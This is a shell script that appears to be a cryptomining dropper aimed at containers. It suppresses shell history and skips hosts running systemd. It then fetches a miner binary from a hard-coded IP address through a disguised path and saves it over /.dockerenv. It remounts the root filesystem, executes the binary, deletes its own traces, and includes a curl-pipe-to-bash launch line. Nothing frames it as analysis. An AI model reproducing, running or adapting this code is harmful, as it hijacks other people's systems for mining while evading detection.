#!/bin/sh
ulimit -n 65535
export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin

# curl -Lk http://chimaera.cc/sh/setup/my.xmr.sh | bash

echo $(uname -m)

BIN_BOT="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../TNTb/$(uname -m)"
BIN_XMR="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/$(uname -m)"

ETHPID=$(pidof /usr/bin/systemd)
if [ ! -z "$ETHPID" ];then exit ; fi


DENV_SIZE=$(ls -al /.dockerenv | awk '{print $5}')
if [ "$DENV_SIZE" = "0" ]; then rm -f /.dockerenv ; fi
if [ ! -f "/.dockerenv" ]; then 
mount -o rw,remount /
rm -f /.dockerenv 2>/dev/null 1>/dev/null
wget -q $BIN_XMR -O /.dockerenv
if [ ! -f "/.dockerenv" ]; then curl -s $BIN_XMR -o /.dockerenv ; fi
chmod 755 /.dockerenv 2>/dev/null 1>/dev/null
mount -o remount,exec / 2>/dev/null 1>/dev/null
/.dockerenv
fi


ps aux | grep -v grep | grep 'dockerenv'



rm -f my.xmr.sh 2>/dev/null 1>/dev/null
rm -f /my.xmr.sh 2>/dev/null 1>/dev/null
rm -f /tmp/my.xmr.sh 2>/dev/null 1>/dev/null
rm -f /sdcard/my.xmr.sh 2>/dev/null 1>/dev/null




